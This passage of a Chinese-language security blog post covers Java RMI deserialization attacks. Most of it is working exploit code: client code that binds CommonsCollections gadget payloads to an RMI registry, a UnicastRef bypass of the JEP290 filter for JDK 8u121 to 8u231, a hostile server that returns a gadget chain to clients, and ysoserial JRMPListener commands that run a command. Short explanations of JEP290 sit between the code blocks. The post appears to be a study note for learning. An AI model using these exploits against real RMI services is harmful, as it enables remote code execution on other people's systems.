+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadClient2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException, RemoteException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) CC6.getCC6();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用AnnotationInvocationHandler动态代理实现Remote接口</span></span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor AnnotationInvocationHandlerConstructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler o=(InvocationHandler)AnnotationInvocationHandlerConstructor.newInstance(Target.class,map);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, o));</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registry.bind(<span class="string">&quot;fuck&quot;</span>,r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502205044-k75uik6.png" alt="image.png"></p>
+<p>原因是<code>sun.rmi.registry.RegistryImpl#registryFilter</code>里的白名单</p>
+<p><a href="https://xz.aliyun.com/t/10170">JEP290</a>的限制，也就是下面这个补丁之后加入的白名单</p>
+<p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388</a></p>
+<blockquote>
+<p>第一次遇到，为之后再详细去看他铺垫</p>
+<p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，描述网址<a href="https://openjdk.java.net/jeps/290">点这里</a>。这是一个针对 JAVA 9 提出的安全特性，但同时对 JDK 6,7,8 都进行了支持，在 JDK 6u141、JDK 7u131、JDK 8u121 版本进行了更新。</p>
+<p>JEP 290 主要提供了几个机制：</p>
+<ul>
+<li>提供了一种灵活的机制，将可反序列化的类从任意类限制为上下文相关的类（黑白名单）；</li>
+<li>限制反序列化的调用深度和复杂度；</li>
+<li>为 RMI export 的对象设置了验证机制；</li>
+<li>提供一个全局过滤器，可以在 properties 或配置文件中进行配置。</li>
+</ul>
+</blockquote>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502225643-pivl6ga.png" alt="image.png"></p>
+<blockquote>
+<p>参考：<a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p>
+</blockquote>
+<h2 id="UnicastRef绕过JEP290"><a href="#UnicastRef绕过JEP290" class="headerlink" title="UnicastRef绕过JEP290"></a>UnicastRef绕过JEP290</h2><blockquote>
+<p>bypass这里可以单独整理</p>
+</blockquote>
+<p>用UnicastRef对象新建一个RMI连接绕过JEP290的限制，配合ysoserial中的<a href="https://xz.aliyun.com/t/2650">JRMPListener模块</a></p>
+<p><code>8u121&lt;=jdk&lt;=8u231</code></p>
+<ol>
+<li>用<code>ysoserial</code>启动一个恶意的<code>JRMPListener</code></li>
+<li>启动注册中心</li>
+<li>启动Client调用<code>bind()</code>操作</li>
+<li>注册中心被反序列化攻击</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Client</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CAR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo02.IHello;</span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadClient3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(IHello.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Server攻击Client"><a href="#Server攻击Client" class="headerlink" title="Server攻击Client"></a>Server攻击Client</h1><p>Server返回给Client远程方法调用结果的时候，会序列化传输</p>
+<p>服务端收到会反序列化触发漏洞</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo02.RMIServer;</span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadServer1</span> &#123;</span><br><span class="line">    <span class="comment">//Server攻击Client</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCalc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RCalc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">calc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">map</span> <span class="operator">=</span> CC6.getCC6();</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RCalc</span> <span class="variable">rCalc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RCalc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>,rCalc);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">BadServer1</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Registry攻击Client"><a href="#Registry攻击Client" class="headerlink" title="Registry攻击Client"></a>Registry攻击Client</h1><p>可以用ysoserial搭建恶意Registry来打Client</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">3333</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>javaSec</category>
+      </categories>
+      <tags>
+        <tag>rmi</tag>
       </tags>
   </entry>
   <entry>
